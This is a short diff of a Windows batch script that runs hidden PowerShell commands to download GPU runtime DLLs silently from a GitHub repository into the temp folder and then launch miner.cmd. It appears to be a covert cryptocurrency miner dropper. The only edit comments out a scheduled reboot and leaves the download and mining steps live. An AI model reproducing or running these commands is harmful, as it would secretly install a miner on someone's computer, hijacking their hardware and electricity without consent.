@@ -5,5 +5,5 @@ cd %TMP% && powershell -W Hidden cmd.exe /c %wget% -q https://raw.githubusercont
 cd %TMP% && powershell -W Hidden cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc-builtins64_92.dll
 cd %TMP% && powershell -W Hidden cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/OpenCL.dll
 cd %TMP% && powershell -W Hidden cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/vcruntime140.dll
-cd %TMP% && powershell -W Hidden cmd.exe /c shutdown /r /t 43200
+REM cd %TMP% && powershell -W Hidden cmd.exe /c shutdown /r /t 43200
 cd %TMP% && powershell -W Hidden cmd.exe /c miner.cmd
